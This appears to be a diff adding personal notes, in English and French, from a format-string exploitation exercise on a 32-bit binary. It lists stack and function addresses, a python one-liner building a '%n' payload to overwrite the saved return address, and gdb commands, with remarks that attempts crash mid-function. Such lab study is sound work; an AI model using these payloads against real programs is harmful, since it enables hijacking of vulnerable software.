@@ -1,0 +1,21 @@
+
+
+in printf eip is at 0xbffff4fc
+function o is at 0x080484a4 
+let's put this adress in EIP
+
+
+python -c "print '\xfc\xf4\xff\xbf' + '%134513824x' + '%4\$n'") 
+
+ne marche pas avec 24, 25, 26 plante au milieu de la fonction (<o+2>)
+
+j'arrive pas à lancer function o()
+
+donc j'essaye au milieu de la fonction 
+addresse 0x080484b1
+
+(gdb) print 0x080484aa
+$2 = 134513834
+
+(gdb) set args <<<$(python -c "print '\xfc\xf4\xff\xbf' + '%134513830x' + '' + '%4\$n'")
+
